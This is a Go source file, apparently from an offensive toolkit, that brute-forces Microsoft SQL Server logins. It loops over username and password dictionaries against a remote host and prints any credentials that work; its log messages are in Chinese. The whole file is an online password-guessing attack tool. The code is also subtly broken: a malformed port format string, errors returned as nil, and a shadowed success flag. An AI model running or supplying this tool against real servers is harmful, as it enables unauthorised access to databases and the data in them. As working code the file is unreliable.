package pac

import (
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
	"os"
	"strings"
)

var (
	database = "master"
)

func MssqlConnect(Rhost string, Rport string, Ruser string, pwd string) (err error, db *sql.DB, sign bool) {
	connString := fmt.Sprintf("server=%s;port%d;database=%s;user id=%s;password=%s", Rhost, Rport, database, Ruser, pwd)

	conn, err := sql.Open("mssql", connString)
	if err != nil {
		return nil, nil, false
	}

	err = conn.Ping()
	if err != nil {
		return nil, nil, false
	}
	sign = true

	return err, conn, sign
}

func MssqlCrack(Rhost string, Rport string) {
	Info("开始爆破,请稍等.....")
	sign = false
	for _, user := range Userdict["mssql"] {
		for _, pass := range Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			_, _, sign := MssqlConnect(Rhost, Rport, user, pass)
			if sign == true {
				Success(fmt.Sprintf("账号密码为：%s:%s", user, pass))
				os.Exit(0)
			} else {
				fmt.Println(fmt.Sprintf("%s:%s 未成功爆破出账号密码", user, pass))
			}
		}
	}
}
